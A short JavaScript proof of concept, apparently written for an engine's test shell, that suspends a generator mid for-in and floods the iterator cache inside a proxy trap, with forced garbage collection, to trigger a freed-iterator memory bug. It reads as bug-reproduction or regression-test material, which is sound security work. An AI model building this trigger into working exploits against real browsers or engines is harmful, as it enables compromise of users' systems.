// Generator-suspended iterator + iterator cache flooding to drop cache
// retention, then gc to finalize.

function* gen() { for (let p in target) yield p; }

var target = { a:1, b:2, c:3, victim:4, d:5, e:6, f:7, g:8 };

var g = gen();
g.next();  // suspend mid-for-in, ni_gen registered on enumerators list

var handler = {
  getPrototypeOf(t) { return null; },
  getOwnPropertyDescriptor(t, k) {
    // Flood iterator cache with many distinct shapes so ni_gen gets evicted.
    for (let i = 0; i < 200; i++) {
      let o = {};
      for (let j = 0; j < i; j++) o['k'+j] = j;
      for (let p in o) {}  // creates NativeIterators with unique shapes
    }
    g = null;
    gc();
    gc();
    gc();
    finishgc();
    return undefined;  // !enumerable → cursor->markDeleted() after return
  },
  has(t,k) { return true; },
  ownKeys(t) { return Reflect.ownKeys(t); },
  deleteProperty: (t, p) => Reflect.deleteProperty(t, p),
};
var protoProxy = new Proxy({}, handler);
Object.setPrototypeOf(target, protoProxy);

for (var p in target) {
  delete target.victim;
}
